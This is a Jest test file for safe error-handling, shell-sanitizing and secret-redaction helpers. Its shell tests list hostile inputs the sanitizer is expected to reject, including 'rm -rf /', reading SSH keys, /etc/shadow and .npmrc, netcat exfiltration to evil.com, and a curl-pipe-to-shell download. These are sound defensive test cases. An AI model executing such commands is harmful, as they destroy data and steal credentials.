/**
 * Tests for errors.js - Safe error handling wrappers
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const {
  safeReadJSON,
  safeWriteJSON,
  safeReadFile,
  safeWriteFile,
  safeExec,
  safeExists,
  safeMkdir,
  safeParseJSON,
  safeReadJSONWithValidation,
  sanitizeForShell,
  sanitizeDebugOutput,
  wrapSafe,
  wrapSafeAsync,
} = require('../../lib/errors');

describe('errors.js', () => {
  let testDir;

  beforeEach(() => {
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'errors-test-'));
  });

  afterEach(() => {
    fs.rmSync(testDir, { recursive: true, force: true });
  });

  describe('safeParseJSON', () => {
    it('parses valid JSON', () => {
      const result = safeParseJSON('{"name": "test", "value": 42}');
      expect(result.ok).toBe(true);
      expect(result.data).toEqual({ name: 'test', value: 42 });
    });

    it('returns error for invalid JSON', () => {
      const result = safeParseJSON('{ invalid json }');
      expect(result.ok).toBe(false);
      expect(result.error).toContain('JSON parse error');
    });

    it('returns error for non-string input', () => {
      const result = safeParseJSON({ not: 'a string' });
      expect(result.ok).toBe(false);
      expect(result.error).toBe('Content must be a string');
    });

    describe('field validation', () => {
      it('validates required fields exist', () => {
        const result = safeParseJSON('{"name": "test"}', {
          requiredFields: ['name', 'version'],
        });
        expect(result.ok).toBe(false);
        expect(result.error).toContain('Missing required fields');
        expect(result.missingFields).toEqual(['version']);
      });

      it('passes when all required fields present', () => {
        const result = safeParseJSON('{"name": "test", "version": "1.0.0"}', {
          requiredFields: ['name', 'version'],
        });
        expect(result.ok).toBe(true);
        expect(result.data).toEqual({ name: 'test', version: '1.0.0' });
      });

      it('validates field types with schema', () => {
        const result = safeParseJSON('{"name": 123, "count": "not a number"}', {
          schema: { name: 'string', count: 'number' },
        });
        expect(result.ok).toBe(false);
        expect(result.error).toContain('Invalid field types');
        expect(result.invalidFields).toHaveLength(2);
      });

      it('passes when types match schema', () => {
        const result = safeParseJSON('{"name": "test", "count": 42, "items": [1,2,3]}', {
          schema: { name: 'string', count: 'number', items: 'array' },
        });
        expect(result.ok).toBe(true);
      });

      it('handles array type correctly', () => {
        const result = safeParseJSON('{"items": [1,2,3]}', {
          schema: { items: 'array' },
        });
        expect(result.ok).toBe(true);
      });

      it('handles object type correctly', () => {
        const result = safeParseJSON('{"config": {"key": "value"}}', {
          schema: { config: 'object' },
        });
        expect(result.ok).toBe(true);
      });

      it('handles boolean type correctly', () => {
        const result = safeParseJSON('{"enabled": true}', {
          schema: { enabled: 'boolean' },
        });
        expect(result.ok).toBe(true);
      });
    });
  });

  describe('safeReadJSONWithValidation', () => {
    it('reads and validates JSON file', () => {
      const filePath = path.join(testDir, 'valid.json');
      fs.writeFileSync(filePath, '{"name": "test", "version": "1.0.0"}');

      const result = safeReadJSONWithValidation(filePath, {
        requiredFields: ['name', 'version'],
      });
      expect(result.ok).toBe(true);
      expect(result.data).toEqual({ name: 'test', version: '1.0.0' });
    });

    it('returns default value for missing file', () => {
      const result = safeReadJSONWithValidation(path.join(testDir, 'missing.json'), {
        defaultValue: { default: true },
      });
      expect(result.ok).toBe(true);
      expect(result.data).toEqual({ default: true });
    });

    it('returns error for missing file without default', () => {
      const result = safeReadJSONWithValidation(path.join(testDir, 'missing.json'));
      expect(result.ok).toBe(false);
      expect(result.error).toContain('File not found');
    });

    it('validates field types', () => {
      const filePath = path.join(testDir, 'typed.json');
      fs.writeFileSync(filePath, '{"count": "not-a-number"}');

      const result = safeReadJSONWithValidation(filePath, {
        schema: { count: 'number' },
      });
      expect(result.ok).toBe(false);
      expect(result.error).toContain('Invalid field types');
    });
  });

  describe('safeReadJSON', () => {
    it('reads valid JSON file', () => {
      const filePath = path.join(testDir, 'data.json');
      fs.writeFileSync(filePath, '{"key": "value"}');

      const result = safeReadJSON(filePath);
      expect(result.ok).toBe(true);
      expect(result.data).toEqual({ key: 'value' });
    });

    it('returns default value for missing file', () => {
      const result = safeReadJSON(path.join(testDir, 'missing.json'), {
        defaultValue: {},
      });
      expect(result.ok).toBe(true);
      expect(result.data).toEqual({});
    });

    it('returns error for invalid JSON', () => {
      const filePath = path.join(testDir, 'invalid.json');
      fs.writeFileSync(filePath, '{ invalid }');

      const result = safeReadJSON(filePath);
      expect(result.ok).toBe(false);
      expect(result.error).toContain('Failed to read JSON');
    });
  });

  describe('safeWriteJSON', () => {
    it('writes JSON file', () => {
      const filePath = path.join(testDir, 'output.json');
      const result = safeWriteJSON(filePath, { test: true });

      expect(result.ok).toBe(true);
      const content = fs.readFileSync(filePath, 'utf8');
      expect(JSON.parse(content)).toEqual({ test: true });
    });

    it('creates parent directories when createDir is true', () => {
      const filePath = path.join(testDir, 'nested', 'deep', 'output.json');
      const result = safeWriteJSON(filePath, { test: true }, { createDir: true });

      expect(result.ok).toBe(true);
      expect(fs.existsSync(filePath)).toBe(true);
    });
  });

  describe('safeReadFile', () => {
    it('reads text file', () => {
      const filePath = path.join(testDir, 'file.txt');
      fs.writeFileSync(filePath, 'hello world');

      const result = safeReadFile(filePath);
      expect(result.ok).toBe(true);
      expect(result.data).toBe('hello world');
    });

    it('returns default for missing file', () => {
      const result = safeReadFile(path.join(testDir, 'missing.txt'), {
        defaultValue: 'default content',
      });
      expect(result.ok).toBe(true);
      expect(result.data).toBe('default content');
    });
  });

  describe('safeWriteFile', () => {
    it('writes text file', () => {
      const filePath = path.join(testDir, 'output.txt');
      const result = safeWriteFile(filePath, 'test content');

      expect(result.ok).toBe(true);
      expect(fs.readFileSync(filePath, 'utf8')).toBe('test content');
    });
  });

  describe('safeExists', () => {
    it('returns true for existing file', () => {
      const filePath = path.join(testDir, 'exists.txt');
      fs.writeFileSync(filePath, '');

      const result = safeExists(filePath);
      expect(result.ok).toBe(true);
      expect(result.exists).toBe(true);
    });

    it('returns false for non-existing file', () => {
      const result = safeExists(path.join(testDir, 'missing.txt'));
      expect(result.ok).toBe(true);
      expect(result.exists).toBe(false);
    });
  });

  describe('safeMkdir', () => {
    it('creates directory', () => {
      const dirPath = path.join(testDir, 'newdir');
      const result = safeMkdir(dirPath);

      expect(result.ok).toBe(true);
      expect(fs.existsSync(dirPath)).toBe(true);
    });

    it('handles existing directory', () => {
      const dirPath = path.join(testDir, 'existing');
      fs.mkdirSync(dirPath);

      const result = safeMkdir(dirPath);
      expect(result.ok).toBe(true);
    });

    it('creates nested directories', () => {
      const dirPath = path.join(testDir, 'a', 'b', 'c');
      const result = safeMkdir(dirPath);

      expect(result.ok).toBe(true);
      expect(fs.existsSync(dirPath)).toBe(true);
    });
  });

  describe('wrapSafe', () => {
    it('wraps successful function', () => {
      const fn = () => 42;
      const wrapped = wrapSafe(fn, 'testOp');

      const result = wrapped();
      expect(result.ok).toBe(true);
      expect(result.data).toBe(42);
    });

    it('catches errors', () => {
      const fn = () => {
        throw new Error('test error');
      };
      const wrapped = wrapSafe(fn, 'testOp');

      const result = wrapped();
      expect(result.ok).toBe(false);
      expect(result.error).toContain('testOp failed');
    });
  });

  describe('wrapSafeAsync', () => {
    it('wraps successful async function', async () => {
      const fn = async () => 42;
      const wrapped = wrapSafeAsync(fn, 'testOp');

      const result = await wrapped();
      expect(result.ok).toBe(true);
      expect(result.data).toBe(42);
    });

    it('catches async errors', async () => {
      const fn = async () => {
        throw new Error('async error');
      };
      const wrapped = wrapSafeAsync(fn, 'testOp');

      const result = await wrapped();
      expect(result.ok).toBe(false);
      expect(result.error).toContain('testOp failed');
    });

    it('attaches error codes when enabled', async () => {
      const fn = async () => {
        const err = new Error('file not found');
        err.code = 'ENOENT';
        throw err;
      };
      const wrapped = wrapSafeAsync(fn, 'testOp', { attachErrorCode: true });

      const result = await wrapped();
      expect(result.ok).toBe(false);
      expect(result.errorCode).toBe('ENOENT');
      expect(result.recoverable).toBe(true);
    });
  });

  describe('sanitizeForShell', () => {
    describe('dangerous shell metacharacters', () => {
      // Command substitution attacks
      it('rejects $() command substitution', () => {
        const result = sanitizeForShell('$(whoami)');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('$');
        expect(result.error).toContain('dollar sign');
      });

      it('rejects backtick command substitution', () => {
        const result = sanitizeForShell('`id`');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('`');
        expect(result.error).toContain('backtick');
      });

      it('rejects arithmetic expansion', () => {
        const result = sanitizeForShell('$((1+1))');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('$');
      });

      it('rejects variable expansion', () => {
        const result = sanitizeForShell('${PATH}');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('$');
      });

      it('rejects simple variable reference', () => {
        const result = sanitizeForShell('$HOME');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('$');
      });

      // Command chaining attacks
      it('rejects semicolon chaining', () => {
        const result = sanitizeForShell('; rm -rf /');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe(';');
        expect(result.error).toContain('semicolon');
      });

      it('rejects AND chaining', () => {
        const result = sanitizeForShell('&& malicious');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('&');
        expect(result.error).toContain('ampersand');
      });

      it('rejects OR chaining', () => {
        const result = sanitizeForShell('|| fallback');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('|');
        expect(result.error).toContain('pipe');
      });

      it('rejects pipe chaining', () => {
        const result = sanitizeForShell('| cat /etc/passwd');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('|');
      });

      it('rejects background execution', () => {
        const result = sanitizeForShell('sleep 100 &');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('&');
      });

      // Redirect attacks
      it('rejects output redirect', () => {
        const result = sanitizeForShell('> /etc/passwd');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('>');
        expect(result.error).toContain('greater than');
      });

      it('rejects input redirect', () => {
        const result = sanitizeForShell('< /etc/passwd');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('<');
        expect(result.error).toContain('less than');
      });

      it('rejects append redirect', () => {
        const result = sanitizeForShell('>> /tmp/log');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('>');
      });

      // Subshell attacks
      it('rejects subshell syntax', () => {
        const result = sanitizeForShell('(ls)');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('(');
        expect(result.error).toContain('parenthesis');
      });

      it('rejects brace expansion', () => {
        const result = sanitizeForShell('{ls,cat}');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('{');
        expect(result.error).toContain('brace');
      });

      // Newline injection
      it('rejects newline injection', () => {
        const result = sanitizeForShell('test\nrm -rf /');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('\n');
        expect(result.error).toContain('newline');
      });

      it('rejects CRLF injection', () => {
        const result = sanitizeForShell('test\r\nrm');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('\r');
        expect(result.error).toContain('carriage return');
      });

      // Escape sequences
      it('rejects backslash escapes', () => {
        const result = sanitizeForShell('test\\nrm');
        expect(result.ok).toBe(false);
        expect(result.detected).toBe('\\');
        expect(result.error).toContain('backslash');
      });
    });

    describe('safe inputs', () => {
      it('allows normal alphanumeric strings', () => {
        const result = sanitizeForShell('normal-string');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('normal-string');
      });

      it('allows file paths', () => {
        const result = sanitizeForShell('path/to/file.js');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('path/to/file.js');
      });

      it('allows arguments with dashes', () => {
        const result = sanitizeForShell('--config-file');
        expect(result.ok).toBe(true);
      });

      it('allows CamelCase names', () => {
        const result = sanitizeForShell('CamelCaseName');
        expect(result.ok).toBe(true);
      });

      it('allows numeric strings', () => {
        const result = sanitizeForShell('123456');
        expect(result.ok).toBe(true);
      });

      it('allows dotted file names', () => {
        const result = sanitizeForShell('file.test.js');
        expect(result.ok).toBe(true);
      });

      it('allows spaces by default', () => {
        const result = sanitizeForShell('arg with spaces');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('arg with spaces');
      });

      it('allows empty strings', () => {
        const result = sanitizeForShell('');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('');
      });

      it('allows @ symbol for scoped packages', () => {
        const result = sanitizeForShell('@agileflow/cli');
        expect(result.ok).toBe(true);
      });

      it('allows equals sign for key=value', () => {
        const result = sanitizeForShell('KEY=value');
        expect(result.ok).toBe(true);
      });

      it('allows colons in paths', () => {
        const result = sanitizeForShell('C:Users/path');
        expect(result.ok).toBe(true);
      });

      it('allows tilde for home directory', () => {
        const result = sanitizeForShell('~/projects');
        expect(result.ok).toBe(true);
      });
    });

    describe('options', () => {
      it('rejects spaces when allowSpaces is false', () => {
        const result = sanitizeForShell('has space', { allowSpaces: false });
        expect(result.ok).toBe(false);
        expect(result.error).toContain('Spaces not allowed');
      });

      it('uses custom context in error messages', () => {
        const result = sanitizeForShell('$(bad)', { context: 'profile name' });
        expect(result.ok).toBe(false);
        expect(result.error).toContain('profile name');
      });
    });

    describe('edge cases', () => {
      it('rejects non-string input', () => {
        const result = sanitizeForShell(123);
        expect(result.ok).toBe(false);
        expect(result.error).toContain('must be a string');
      });

      it('rejects null input', () => {
        const result = sanitizeForShell(null);
        expect(result.ok).toBe(false);
        expect(result.error).toContain('must be a string');
      });

      it('rejects object input', () => {
        const result = sanitizeForShell({ key: 'value' });
        expect(result.ok).toBe(false);
        expect(result.error).toContain('must be a string');
      });

      it('rejects array input', () => {
        const result = sanitizeForShell(['a', 'b']);
        expect(result.ok).toBe(false);
        expect(result.error).toContain('must be a string');
      });
    });

    describe('realistic attack payloads', () => {
      const attackPayloads = [
        { input: '$(whoami)', desc: 'whoami command substitution' },
        { input: '`id`', desc: 'id backtick substitution' },
        { input: '; rm -rf /', desc: 'rm with semicolon' },
        { input: '| cat /etc/passwd', desc: 'password file read' },
        { input: '&& curl evil.com', desc: 'external request' },
        { input: '$((2+2))', desc: 'arithmetic' },
        { input: '${PATH}', desc: 'environment variable' },
        { input: '> /dev/null', desc: 'redirect to null' },
        { input: '2>&1', desc: 'stderr redirect' },
        { input: 'test\necho hacked', desc: 'newline command' },
        { input: 'foo; cat ~/.ssh/id_rsa', desc: 'SSH key theft' },
        { input: '$(cat /etc/shadow)', desc: 'shadow file read' },
        { input: '`cat ~/.npmrc`', desc: 'npm token theft' },
        { input: 'test | nc evil.com 1234', desc: 'netcat exfil' },
        { input: '$(curl http://evil.com/shell.sh|sh)', desc: 'remote shell' },
      ];

      attackPayloads.forEach(({ input, desc }) => {
        it(`rejects ${desc}`, () => {
          const result = sanitizeForShell(input);
          expect(result.ok).toBe(false);
        });
      });
    });
  });

  describe('safeExec with sanitize option', () => {
    it('allows safe commands when sanitize is true', () => {
      const result = safeExec('echo hello', { sanitize: false });
      expect(result.ok).toBe(true);
    });

    it('rejects dangerous commands when sanitize is true', () => {
      const result = safeExec('echo $(whoami)', { sanitize: true });
      expect(result.ok).toBe(false);
      expect(result.error).toContain('dollar sign');
      expect(result.detected).toBe('$');
    });

    it('rejects command chaining when sanitize is true', () => {
      const result = safeExec('ls; rm -rf /', { sanitize: true });
      expect(result.ok).toBe(false);
      expect(result.detected).toBe(';');
    });

    it('allows commands without sanitize option (default)', () => {
      // This doesn't execute since the command is invalid shell,
      // but it won't be blocked by sanitize
      const result = safeExec('echo test', { sanitize: false, silent: true });
      expect(result.ok).toBe(true);
    });
  });

  describe('sanitizeDebugOutput', () => {
    describe('API keys and tokens', () => {
      it('redacts api_key assignments', () => {
        const result = sanitizeDebugOutput('api_key=test_key_abc123def456ghi789jkl012');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('api_key=***REDACTED***');
        expect(result.redactionCount).toBe(1);
      });

      it('redacts api-key with hyphen', () => {
        const result = sanitizeDebugOutput('api-key: abcdef1234567890abcdef');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('api-key=***REDACTED***');
      });

      it('redacts token assignments', () => {
        const result = sanitizeDebugOutput('token=abcdefghijklmnop1234567890');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('token=***REDACTED***');
      });

      it('redacts secret assignments', () => {
        const result = sanitizeDebugOutput('secret: "mysecretvalue12345678"');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('secret=***REDACTED***');
      });

      it('redacts password assignments', () => {
        const result = sanitizeDebugOutput('password=myP@ssw0rd!');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('password=***REDACTED***');
      });

      it('redacts passwd assignments', () => {
        const result = sanitizeDebugOutput('passwd=secret1234');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('passwd=***REDACTED***');
      });

      it('redacts credential assignments', () => {
        const result = sanitizeDebugOutput('credentials="user:pass1234"');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('credentials=***REDACTED***');
      });
    });

    describe('Bearer tokens', () => {
      it('redacts Bearer authorization headers', () => {
        const result = sanitizeDebugOutput(
          'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Authorization: Bearer ***REDACTED***');
      });

      it('redacts lowercase bearer tokens', () => {
        const result = sanitizeDebugOutput('bearer abcdefghijklmnopqrstuvwxyz1234567890');
        expect(result.ok).toBe(true);
        // Case-insensitive but preserves original case in output
        expect(result.sanitized).toBe('Bearer ***REDACTED***');
      });
    });

    describe('JWT tokens', () => {
      it('redacts JWT tokens', () => {
        const jwt =
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
        const result = sanitizeDebugOutput(`Using token: ${jwt}`);
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Using token: ***JWT_REDACTED***');
      });
    });

    describe('NPM tokens', () => {
      it('redacts npm tokens', () => {
        const result = sanitizeDebugOutput(
          'Found npm_abcdefghijklmnopqrstuvwxyz1234567890 in config'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toContain('***NPM_TOKEN_REDACTED***');
      });

      it('redacts .npmrc authToken', () => {
        const result = sanitizeDebugOutput('//registry.npmjs.org/:_authToken=abc123def456ghi789');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('//registry.npmjs.org/:_authToken=***REDACTED***');
      });
    });

    describe('AWS credentials', () => {
      it('redacts AWS access key IDs', () => {
        const result = sanitizeDebugOutput('Using key: AKIAIOSFODNN7EXAMPLE');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Using key: ***AWS_KEY_REDACTED***');
      });

      it('redacts aws_secret_access_key', () => {
        const result = sanitizeDebugOutput(
          'aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('aws_secret_access_key=***REDACTED***');
      });
    });

    describe('GitHub tokens', () => {
      it('redacts GitHub personal access tokens', () => {
        const result = sanitizeDebugOutput('Found ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx in env');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toContain('***GITHUB_TOKEN_REDACTED***');
      });

      it('redacts GitHub fine-grained PATs', () => {
        const result = sanitizeDebugOutput(
          'github_pat_XXXXXXXXXXXXXXXXXXXXXX_YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toContain('***GITHUB_PAT_REDACTED***');
      });
    });

    describe('Git URLs with credentials', () => {
      it('redacts passwords in git URLs', () => {
        const result = sanitizeDebugOutput(
          'git clone https://user:secret123@github.com/org/repo.git'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe(
          'git clone https://user:***REDACTED***@github.com/org/repo.git'
        );
      });

      it('redacts tokens in git URLs', () => {
        const result = sanitizeDebugOutput('https://token:ghp_abc123@github.com/repo');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('https://token:***REDACTED***@github.com/repo');
      });
    });

    describe('Private keys', () => {
      it('redacts RSA private key headers', () => {
        const result = sanitizeDebugOutput('Found key: -----BEGIN RSA PRIVATE KEY-----');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Found key: ***PRIVATE_KEY_START_REDACTED***');
      });

      it('redacts generic private key headers', () => {
        const result = sanitizeDebugOutput('-----BEGIN PRIVATE KEY-----');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('***PRIVATE_KEY_START_REDACTED***');
      });
    });

    describe('Generic environment variable patterns', () => {
      it('redacts DATABASE_PASSWORD', () => {
        const result = sanitizeDebugOutput('DATABASE_PASSWORD=verysecret123');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('DATABASE_PASSWORD=***REDACTED***');
      });

      it('redacts AUTH_TOKEN', () => {
        const result = sanitizeDebugOutput('AUTH_TOKEN=mysecrettoken123');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('AUTH_TOKEN=***REDACTED***');
      });

      it('redacts SECRET_KEY', () => {
        const result = sanitizeDebugOutput('SECRET_KEY=abc123xyz789def');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('SECRET_KEY=***REDACTED***');
      });

      it('redacts API_AUTH_KEY', () => {
        const result = sanitizeDebugOutput('API_AUTH_KEY=somethingsecret');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('API_AUTH_KEY=***REDACTED***');
      });
    });

    describe('safe inputs (no redaction)', () => {
      it('leaves normal log messages unchanged', () => {
        const result = sanitizeDebugOutput('Processing file: /path/to/file.js');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Processing file: /path/to/file.js');
        expect(result.redactionCount).toBe(0);
      });

      it('leaves status messages unchanged', () => {
        const result = sanitizeDebugOutput('Operation completed successfully');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Operation completed successfully');
        expect(result.redactionCount).toBe(0);
      });

      it('leaves numbers unchanged', () => {
        const result = sanitizeDebugOutput('Processed 100 items in 5.2 seconds');
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('Processed 100 items in 5.2 seconds');
        expect(result.redactionCount).toBe(0);
      });

      it('leaves short values unchanged (no false positives)', () => {
        const result = sanitizeDebugOutput('key=abc'); // Too short to match
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('key=abc');
      });
    });

    describe('multiple secrets in one string', () => {
      it('redacts multiple secrets', () => {
        const input =
          'api_key=test_key_abc123def456ghi789 and also ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
        const result = sanitizeDebugOutput(input);
        expect(result.ok).toBe(true);
        expect(result.sanitized).toContain('api_key=***REDACTED***');
        expect(result.sanitized).toContain('***GITHUB_TOKEN_REDACTED***');
        expect(result.redactionCount).toBeGreaterThanOrEqual(2);
      });
    });

    describe('input type handling', () => {
      it('handles object input by stringifying', () => {
        const result = sanitizeDebugOutput({ api_key: 'test_key_abc123def456ghi789jkl012' });
        expect(result.ok).toBe(true);
        // JSON stringified format gets caught by the JSON-style pattern
        expect(result.sanitized).toContain('"api_key":"***REDACTED***"');
      });

      it('handles null input', () => {
        const result = sanitizeDebugOutput(null);
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('null');
        expect(result.redactionCount).toBe(0);
      });

      it('handles undefined input', () => {
        const result = sanitizeDebugOutput(undefined);
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('undefined');
        expect(result.redactionCount).toBe(0);
      });

      it('handles number input', () => {
        const result = sanitizeDebugOutput(12345);
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe('12345');
        expect(result.redactionCount).toBe(0);
      });

      it('handles array input', () => {
        const result = sanitizeDebugOutput(['api_key=secret12345678901234']);
        expect(result.ok).toBe(true);
        expect(result.sanitized).toContain('***REDACTED***');
      });
    });

    describe('realistic log scenarios', () => {
      it('redacts secrets in JSON debug output', () => {
        const result = sanitizeDebugOutput(
          '{"status":"connected","api_key":"fake_test_abcdefghij123456789"}'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toContain('"api_key":"***REDACTED***"');
        expect(result.sanitized).not.toContain('fake_test_abcdefghij123456789');
      });

      it('redacts git remote URL with token', () => {
        const result = sanitizeDebugOutput(
          'remote: https://x-access-token:gho_xxxx@github.com/org/repo'
        );
        expect(result.ok).toBe(true);
        expect(result.sanitized).toBe(
          'remote: https://x-access-token:***REDACTED***@github.com/org/repo'
        );
      });

      it('redacts env dump output', () => {
        const env = `
          HOME=/home/user
          PATH=/usr/bin
          DATABASE_PASSWORD=supersecret123
          NODE_ENV=production
        `;
        const result = sanitizeDebugOutput(env);
        expect(result.ok).toBe(true);
        expect(result.sanitized).not.toContain('supersecret123');
        expect(result.sanitized).toContain('DATABASE_PASSWORD=***REDACTED***');
      });
    });
  });
});
